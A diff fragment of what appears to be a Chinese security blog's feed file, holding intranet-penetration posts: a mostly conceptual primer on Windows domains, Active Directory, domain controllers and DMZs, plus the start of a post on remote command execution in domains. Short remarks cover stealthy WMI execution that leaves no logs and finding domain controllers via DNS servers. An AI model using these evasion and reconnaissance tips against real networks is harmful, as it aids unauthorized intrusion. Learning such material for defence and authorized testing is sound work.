-<h2 id="0x07-总结"><a href="#0x07-总结" class="headerlink" title="0x07 总结"></a>0x07 总结</h2><p>今天就先写到这，回头再查点资料，再补充补充。。。</p>
-]]></content>
-      <categories>
-        <category>内网渗透</category>
-      </categories>
-      <tags>
-        <tag>内网渗透</tag>
-        <tag>域</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>域渗透远程执行命令的几种姿势</title>
     <url>/posts/35747.html</url>
     <content><![CDATA[<h1 id="域渗透远程执行命令的几种姿势"><a href="#域渗透远程执行命令的几种姿势" class="headerlink" title="域渗透远程执行命令的几种姿势"></a>域渗透远程执行命令的几种姿势</h1><h2 id="0x00-vmic"><a href="#0x00-vmic" class="headerlink" title="0x00 vmic"></a>0x00 vmic</h2><p>WMI 的全称是 Windows Management Instrumentation，它出现在所有的 Windows 操作系统中，并由一组强大的工具集合组成，用于管理本地或远程的 Windows 系统，攻击者使用 wmi 来进行攻击，但 Windows 系统默认不会在日志中记录这些操作，可以做到<strong>无日志</strong>，攻击脚本无需写入到磁盘，增加了隐蔽性。推荐使用 wmic 进行远程执行命令。</p>
@@ -4184,6 +4080,110 @@ string substr(string, start, length)
 ]]></content>
       <tags>
         <tag>域渗透</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>内网渗透基础总结</title>
+    <url>/posts/44578.html</url>
+    <content><![CDATA[<h2 id="0x00-内网"><a href="#0x00-内网" class="headerlink" title="0x00 内网"></a>0x00 内网</h2><p>局域网（Local Area Network，LAN）是指在某一区域内由多台计算机互联成的计算机组。一般是方圆几千米以内。局域网可以实现文件管理、应用软件共享、打印机共享、工作组内的日程安排、电子邮件和传真通信服务等功能。局域网是封闭型的，可以由办公室内的两台计算机组成，也可以由一个公司内的上千台计算机组成。</p>
+<h2 id="0x01-工作组、家庭组、域"><a href="#0x01-工作组、家庭组、域" class="headerlink" title="0x01 工作组、家庭组、域"></a>0x01 工作组、家庭组、域</h2><h3 id="工作组"><a href="#工作组" class="headerlink" title="工作组"></a>工作组</h3><ul>
+<li>所有的计算机都是对等的，没有计算机可以控制另一台计算机。每台计算机都具有一组用户帐户。若要登录到工作组中的任何计算机，您必须具有该计算机上的帐户。</li>
+<li>通常情况下，计算机的数量不超过二十台。</li>
+<li>工作组不受密码保护。</li>
+<li>所有的计算机必须在同一本地网络或子网中。</li>
+</ul>
+<h3 id="家庭组"><a href="#家庭组" class="headerlink" title="家庭组"></a>家庭组</h3><ul>
+<li>家庭网络中的计算机必须属于某个工作组，但它们也可以属于某个家庭组。使用家庭组，可轻松与家庭网络中的其他人共享图片、音乐、视频、文档和打印机。</li>
+<li>家庭组受密码保护，但在将计算机添加到家庭组时，只需要键入一次密码即可。</li>
+</ul>
+<h3 id="域"><a href="#域" class="headerlink" title="域"></a>域</h3><p>域（Domain）是相对工作组（Workgroup）的概念，形象的说，域就像中央集权，由一台或数台域控制器（Domain Controller）管理域内的其他计算机；工作组就像各自为政，组内每一台计算机自己管理自己，他人无法干涉。</p>
+<p>域是一个计算机群体的组合，是一个相对严格的组织，而域控制器则是这个域内的管理核心。</p>
+<p>域控制器（ Domain Controller ，简写为 DC ）可以对域内计算机进行集中管理，比如在域控制器上可以定义所有用户不能更改桌面，或者所有用户的密码长度必须8位以上，而工作组环境的计算机则无法做到这些。</p>
+<p>一般情况下，域控制器集成了DNS服务，可以解析域内的计算机名称（基于TCP/IP），解决了工作组环境不同网段计算机不能使用计算机名互访的问题。</p>
+<ul>
+<li>域(Domain)是Windows网络中独立运行的单位，域之间相互访问则需要建立信任关系(即Trust Relation)。信任关系是连接在域与域之间的桥梁。当一个域与其他域建立了信任关系后， 2个域之间不但可以按需要相互进行管理，还可以跨网分配文件和打印机等设备资源，使不同的域之间实现网络资源的共享与管理。 　　 </li>
+<li>域既是 Windows 网络操作系统的逻辑组织单元，也是Internet的逻辑组织单元，在 Windows 网络操作系统中，域是安全边界。域管理员只能管理域的内部，除非其他的域显式地赋予他管理权限，他才能够访问或者管理其他的域;每个域都有自己的安全策略，以及它与其他域的安全信任关系。 </li>
+<li>域是一种管理边界，用于一组计算机共享共用的安全数据库，域实际上就是一组服务器和工作站的集合。</li>
+</ul>
+<h2 id="0x02-域的分类"><a href="#0x02-域的分类" class="headerlink" title="0x02 域的分类"></a>0x02 域的分类</h2><ul>
+<li>单域</li>
+<li>父域、子域</li>
+<li>域树</li>
+<li>域森林</li>
+<li>DNS域名服务器</li>
+</ul>
+<h3 id="单域"><a href="#单域" class="headerlink" title="单域"></a>单域</h3><p>在一般的具有固定地理位置的小公司里，建立一个域就可以满足所需。</p>
+<p>一般在一个域内要建立至少两个域服务器，一个作为DC，一个是备份DC。如果没有第二个备份DC，那么一旦DC瘫痪了，则域内的其他用户就不能登陆该域了，因为活动目录的数据库（包括用户的帐号信息）是存储在DC中的。而有一台备份域控制器（BDC），则至少该域还能正常使用，期间把瘫痪的DC恢复了就行了。</p>
+<h3 id="父域、子域"><a href="#父域、子域" class="headerlink" title="父域、子域"></a>父域、子域</h3><p>出于管理及其他一些需求，需要在网络中划分多个域，第一个域称为父域，各分部的域称为该域的子域。</p>
+<p>比如一个大公司，它的不同分公司在不同的地理位置，则需父域及子域这样的结构。</p>
+<p>如果把不同地理位置的分公司放在同一个域内，那么他们之间信息交互（包括同步，复制等）所花费的时间会比较长，而且占用的带宽也比较大。（因为在同一个域内，信息交互的条目是很多的，而且不压缩；而在域和域之间，信息交互的条目相对较少，而且压缩。）</p>
+<p>还有一个好处，就是子公司可以通过自己的域来管理自己的资源。</p>
+<p>还有一种情况，就是出于安全策略的考虑，因为每个域都有自己独有的安全策略。比如一个公司的财务部门希望能使用特定的安全策略（包括帐号密码策略等），那么可以将财务部门做成一个子域来单独管理。</p>
+<h3 id="域树"><a href="#域树" class="headerlink" title="域树"></a>域树</h3><ul>
+<li><p>域树指若干个域通过建立信任关系组成的集合。一个域管理员只能管理本域的内部，不能访问或者管理其他的域，二个域之间相互访问则需要建立信任关系（Trust Relation）。比如asia.abc.com与Europe.abc.com访问需要建立信任关系</p>
+</li>
+<li><p>信任关系是连接在域与域之间的桥梁。域树内的父域与子域之间不但可以按需要相互进行管理，还可以跨网分配文件和打印机等设备资源，使不同的域之间实现网络资源的共享与管理，以及相互通信和数据传输。</p>
+</li>
+<li><p>在一个域树中，父域可以包含很多子域，子域是相对父域来说的，指域名中的每一个段。子域只能使用父域作为域名的后缀，也就是说在一个域树中，域的名字是连续的。</p>
+</li>
+</ul>
+<p>abc.com 是一级域</p>
+<p>asia是二级域</p>
+<p><img src="/posts/44578/1.png" alt></p>
+<h3 id="域森林"><a href="#域森林" class="headerlink" title="域森林"></a>域森林</h3><p>域森林指若干个域树通过建立信任关系组成的集合。可以通过域树之间建立的信任关系来管理和使用整个森林中的资源，从而又保持了原有域自身原有的特性。</p>
+<p><img src="/posts/44578/2.png" alt></p>
+<h3 id="DNS服务器"><a href="#DNS服务器" class="headerlink" title="DNS服务器"></a>DNS服务器</h3><ul>
+<li>DNS域名服务器是进行域名和与之对应的IP地址转换的服务器。</li>
+<li>在域树的介绍中，可以看到域树中的域的名字和DNS域的名字非常相似，实际上域的名字就是DNS域的名字，因为域中的计算机使用DNS来定位域控制器和服务器以及其他计算机、网络服务等等。</li>
+<li>一般情况下，我们在内网渗透时就通过寻找DNS服务器来定位域控制器，因为<strong>通常DNS服务器和域控制器会处在同一台机器上</strong>。</li>
+</ul>
+<h2 id="0x03-活动目录-AD"><a href="#0x03-活动目录-AD" class="headerlink" title="0x03 活动目录(AD)"></a>0x03 活动目录(AD)</h2><ul>
+<li>活动目录（Active Directory）是域环境中提供目录服务的组件。</li>
+<li>目录是什么？目录就是存储有关网络对象（如用户、组、计算机、共享资源、打印机和联系人等）的信息。目录服务是帮助用户快速准确的从目录中查找到他所需要的信息的服务。</li>
+<li>如果将企业的内网看成是一本字典，那么内网里的资源就是字典的内容，活动目录就相当于字典的索引。即活动目录存储的是网络中所有资源的快捷方式，用户通过寻找快捷方式而定位资源。</li>
+</ul>
+<p>**<br>逻辑结构**</p>
+<ul>
+<li>在活动目录中，管理员可以完全忽略被管理对象的具体地理位置，而将这些对象按照一定的方式放置在不同的容器中。由于这种组织对象的做法不考虑被管理对象的具体地理位置，这种组织框架称为“<strong>逻辑结构</strong>”。</li>
+<li>活动目录的逻辑结构就包括上面讲到的组织单元（OU）、域（domain）、域树（tree）、域森林（forest）。在域树内的所有域共享一个活动目录，这个活动目录内的数据分散地存储在各个域内，且每一个域只存储该域内的数据。</li>
+</ul>
+<p><strong>活动目录的主要功能</strong></p>
+<ol>
+<li>帐号集中管理，所有帐号均存在服务器上，方便对帐号的重命令/重置密码。</li>
+<li>软件集中管理，统一推送软件，统一安装网络打印机等。利用软件发布策略分发软件，可以让用户自由选择安装软件。</li>
+<li>环境集中管理，利用AD可以统一客户端桌面，IE，TCP/IP等设置。</li>
+<li>增强安全性，统一部署杀毒软件和扫毒任务，集中化管理用户的计算机权限、统一制订用户密码策略等，可监控网络，资料统一管理。</li>
+<li>更可靠，更少的宕机时间。如：利用AD控制用户访问权限，利用群集、负载均衡等技术对文件服务器进行容灾设定，更可靠，岩机时间更少。</li>
+<li>活动目录为Microsoft统一管理的基础平台，其它isa，exchange，sms等服务都依赖于这个基础平台。</li>
+</ol>
+<h2 id="0x04-AD和DC的区别"><a href="#0x04-AD和DC的区别" class="headerlink" title="0x04 AD和DC的区别"></a>0x04 AD和DC的区别</h2><ul>
+<li>如果网络规模较大，我们就会考虑把网络中的众多对象：计算机、用户、用户组、打印机、共享文件等，分门别类、井然有序地放在一个大仓库中，并做好检索信息，以利于查找、管理和使用这些对象（资源）。这个有层次结构的数据库，就是活动目录数据库，简称AD库。</li>
+<li>那么我们应该把这个数据库放在哪台计算机上呢？规定是这样的，我们把存放有活动目录数据库的计算机就称为DC。所以说我们要实现域环境，其实就是要安装AD，当内网中的一台计算机安装了AD后，它就变成了DC。</li>
+<li>DC的本质是一台计算机，AD的本质是提供目录服务的组件</li>
+</ul>
+<h2 id="0x05-域相关概念"><a href="#0x05-域相关概念" class="headerlink" title="0x05 域相关概念"></a>0x05 域相关概念</h2><h3 id="安全域划分"><a href="#安全域划分" class="headerlink" title="安全域划分"></a>安全域划分</h3><p>安全域划分的目的是将一组安全等级相同的计算机划入同一个网段内，这一网段内的计算机拥有相同的网络边界，在网络边界上采用防火墙部署来实现对其他安全域的NACL（网络访问控制策略），允许哪些IP访问此域、不允许哪些访问此域；允许此域访问哪些IP/网段、不允许访问哪些IP/网段。使得其风险最小化，当发生攻击时可以将威胁最大化的隔离，减少对域内计算机的影响。</p>
+<p><img src="/posts/44578/3.png" alt></p>
+<h3 id="DMZ"><a href="#DMZ" class="headerlink" title="DMZ"></a>DMZ</h3><ul>
+<li>两个防火墙之间的空间被称为DMZ。</li>
+<li>DMZ是英文“demilitarized zone”的缩写，中文名称为“隔离区”，也称“非军事化区”。</li>
+<li>为了解决安装防火墙后外部网络的访问用户不能访问内部网络服务器的问题，而设立的一个非安全系统与安全系统之间的缓冲区。</li>
+<li>该缓冲区位于企业内部网络和外部网络之间的小网络区域内。在这个小网络区域内可以放置一些必须公开的服务器设施，如企业Web服务器、FTP服务器和论坛等。</li>
+<li>另一方面，通过这样一个DMZ区域，更加有效地保护了内部网络。因为这种网络部署，比起一般的防火墙方案，对来自外网的攻击者来说又多了一道关卡。</li>
+</ul>
+<h2 id="0x06-域中计算机分类"><a href="#0x06-域中计算机分类" class="headerlink" title="0x06 域中计算机分类"></a>0x06 域中计算机分类</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">域控制器</span><br><span class="line">成员服务器</span><br><span class="line">客户机</span><br><span class="line">独立服务器</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>域控制器是存放活动目录数据库的，是域中必须要有的，而其他三种则不是必须的，也就是说最简单的域可以只包含一台计算机，这台计算机就是该域的域控制器。</li>
+<li>域中各个服务器的角色也是可以改变的，例如域服务器在删除活动目录时，如果是域中最后一个域控制器，则该域服务器会成为独立服务器，如果不是域中唯一的域控制器，则将使该服务器成为成员服务器。同时独立服务器既可以转换为域控制器，也可以加入到某个域成为成员服务器。</li>
+</ul>
+<h2 id="0x07-总结"><a href="#0x07-总结" class="headerlink" title="0x07 总结"></a>0x07 总结</h2><p>今天就先写到这，回头再查点资料，再补充补充。。。</p>
+]]></content>
+      <categories>
+        <category>内网渗透</category>
+      </categories>
+      <tags>
+        <tag>内网渗透</tag>
+        <tag>域</tag>
       </tags>
   </entry>
   <entry>
